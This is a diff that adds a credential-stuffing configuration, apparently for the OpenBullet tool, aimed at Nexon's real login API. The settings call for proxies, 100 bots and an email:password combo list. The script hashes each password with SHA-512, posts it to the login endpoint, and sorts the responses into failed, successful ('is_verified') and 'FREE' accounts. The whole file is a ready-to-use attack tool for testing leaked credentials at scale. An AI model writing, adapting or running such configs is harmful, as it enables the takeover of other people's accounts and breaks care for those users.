@@ -1,0 +1,44 @@
+[SETTINGS]
+{
+  "Name": "Nexon",
+  "SuggestedBots": 100,
+  "LastModified": "2018-05-10T10:46:27.1138863+00:00",
+  "AdditionalInfo": "No capture yet",
+  "Author": "Ruri",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#SHA_512_PASS FUNCTION Hash SHA512 "<PASS>" -> VAR "HASH" 
+#LOWERCASE_HASH FUNCTION ToLowercase "<HASH>" -> VAR "LOWER" 
+#LOGIN REQUEST POST "https://www.nexon.com/account-webapi/login" AutoRedirect=TRUE 
+  CONTENT "{\"id\":\"<USER>\",\"password\":\"<LOWER>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "origin: https://www.nexon.com" 
+  HEADER "referer: https://www.nexon.com/account/it/login" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "User does not exist" 
+    KEY "INVALID_PARAMETER" 
+    KEY "The password is wrong" 
+  KEYCHAIN Success OR 
+    KEY "is_verified" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "country_code\":\"\"" 
